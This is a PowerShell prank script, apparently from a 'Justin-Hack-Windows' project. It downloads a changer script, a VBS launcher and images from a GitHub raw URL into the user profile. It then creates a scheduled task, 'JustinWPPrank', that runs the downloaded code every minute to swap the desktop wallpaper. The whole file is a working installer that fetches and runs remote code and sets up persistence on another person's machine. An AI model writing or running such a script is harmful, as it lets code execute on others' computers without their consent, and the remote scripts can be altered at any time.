# Images avaibles
$imagesName = @("justin", "selena", "justin_jesus", "justin_christmas", "justin_birthday")

# Get current dir
$imgExtension = ".bmp"
$jhPath = "$env:userprofile\jh"
$githubUrl = "https://raw.githubusercontent.com/mxcezl/Justin-Hack-Windows/master/"
$imagesUrl = "$githubUrl/images/"
$changerName = "changer.ps1"
$changerLocalPath = "$jhPath\$changerName"
$changerCallerName = "jhcaller.vbs"
$changerCallerLocalPath = "$jhPath\$changerCallerName"

# Create dir if not exists and hide output
if(!(Test-Path "$jhPath\imgs")){
    New-Item -ItemType Directory -Path "$jhPath\imgs" | Out-Null
}

# Download runner & changer files
$client = new-object System.Net.WebClient
$client.DownloadFile("$githubUrl/changer/$changerName", $changerLocalPath)
$client.DownloadFile("$githubUrl/changer/$changerCallerName", $changerCallerLocalPath)

# Download images from GitHub
$imagesDir = "$env:userprofile\jh\imgs"
$client = new-object System.Net.WebClient
foreach($imageName in $imagesName){
    $client.DownloadFile("$imagesUrl/$imageName$imgExtension", "$imagesDir\$imageName$imgExtension")
}

# Use task manager to set random wallpaper every x minutes
schtasks /create /sc minute /mo 1 /tn "JustinWPPrank" /tr "$changerCallerLocalPath"